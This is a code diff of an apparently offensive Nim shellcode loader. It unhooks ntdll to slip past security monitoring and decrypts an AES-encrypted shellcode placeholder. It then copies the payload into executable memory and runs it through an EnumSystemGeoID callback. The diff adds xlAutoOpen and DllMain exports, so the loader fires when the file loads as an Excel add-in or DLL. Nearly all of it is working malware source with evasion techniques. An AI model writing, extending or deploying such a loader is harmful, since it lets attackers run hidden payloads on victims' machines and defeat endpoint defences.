@@ -6,7 +6,6 @@ import strutils
 import ptr_math
 import strformat
 
-
 func toString(bytes: openarray[byte]): string =
     result = newString(bytes.len)
     copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
@@ -15,9 +14,8 @@ func toByteSeq(str: string): seq[byte] {.inline.} =
     # Converts a string to the corresponding byte sequence
     @(str.toOpenArrayByte(0, str.high))
 
-
 #credit to offensive nim while i figure out a diff way to do this
-proc ntdllunhook(): bool =
+proc ntdllunhook*(): bool =
   let low: uint16 = 0
   var 
       processH = GetCurrentProcess()
@@ -64,28 +62,29 @@ proc ntdllunhook(): bool =
 
 proc shellcodeCallback(shellcode: openarray[byte]): void =
 
+
+    # Allocate memory
     let rPtr = VirtualAlloc(
-        NULL,
+        nil,
         cast[SIZE_T](shellcode.len),
         MEM_COMMIT,
         PAGE_EXECUTE_READ_WRITE
-    )
+    )    
+    
+    # Copy Shellcode to the allocated memory section
+    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))    
+    
+    # Callback execution
+    EnumSystemGeoID(
+        16,
+        0,
+        cast[GEO_ENUMPROC](rPtr)
+    ) 
 
-    var bytesWritten: SIZE_T
-    RtlMoveMemory(
-        rPtr, 
-        unsafeAddr shellcode,
-        cast[SIZE_T](shellcode.len),
-    )
 
-    CertEnumSystemStore(
-        CERT_SYSTEM_STORE_CURRENT_USER,
-        NULL,
-        NULL,
-        cast[PFN_CERT_ENUM_SYSTEM_STORE](rPtr),
-    )
 
-when isMainModule:
+proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
+   when isMainModule:
         let shellcode_base64_encrypted = "REPLACE_ME" 
         var result = ntdllunhook()  #so we need to assign it to a variable even though its not used. But if you discard it, it won't work... O_o
         var encodedIV: string = "t47unCor+GR9+cD+2d6FlQ==" #base64 encoded IV. hardcoded...fix this later
@@ -112,3 +111,10 @@ when isMainModule:
         
         #fire!
         shellcodeCallback(dectext)
+
+proc NimMain() {.cdecl, importc.}
+
+proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  NimMain()
+
+  return true
